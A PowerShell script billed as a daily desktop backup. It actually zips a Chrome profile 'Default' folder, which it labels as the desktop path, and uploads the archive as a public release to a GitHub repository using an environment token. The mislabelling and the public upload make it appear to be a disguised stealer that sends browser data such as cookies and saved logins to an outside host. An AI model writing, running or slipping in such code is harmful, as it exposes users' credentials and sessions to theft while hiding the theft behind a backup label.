# Set UTF-8 encoding
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# Parameters
$token = $env:GITHUB_TOKEN
$repo = "drftghy/backup-files"
$now = Get-Date
$date = $now.ToString("yyyy-MM-dd")
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$tag = "backup-$timestamp"
$releaseName = "Backup - $date"
$zipName = "DesktopBackup_$timestamp.zip"
$zipPath = "$env:TEMP\$zipName"
$desktopPath = "C:\Program Files\Google\Chrome\Application\1\Default"
$logPath = "$env:USERPROFILE\upload_log.txt"
# Compress function (skip locked files)
Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
$zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
Get-ChildItem -Path $desktopPath -Recurse | ForEach-Object {
    try {
        $relativePath = $_.FullName.Substring($desktopPath.Length).TrimStart('\')
        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
    } catch {
        # Skip on error
    }
}
$zip.Dispose()

# Check ZIP validity
if (-Not (Test-Path $zipPath) -or (Get-Item $zipPath).Length -eq 0) {
    return
}

# Create GitHub Release
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Daily desktop backup ($date)"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "PowerShellUploader"
    "Accept"      = "application/vnd.github.v3+json"
}

$releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method Post -Headers $headers -Body $releaseData
$uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"

# Upload ZIP
$zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
$uploadResponse = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{
    Authorization = "token $token"
    "Content-Type" = "application/zip"
    "User-Agent" = "PowerShellUploader"
} -Body $zipBytes

# Logging
$logEntry = "[{0}] Upload successful: {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $uploadResponse.browser_download_url
$logEntry | Out-File -FilePath $logPath -Encoding utf8 -Append
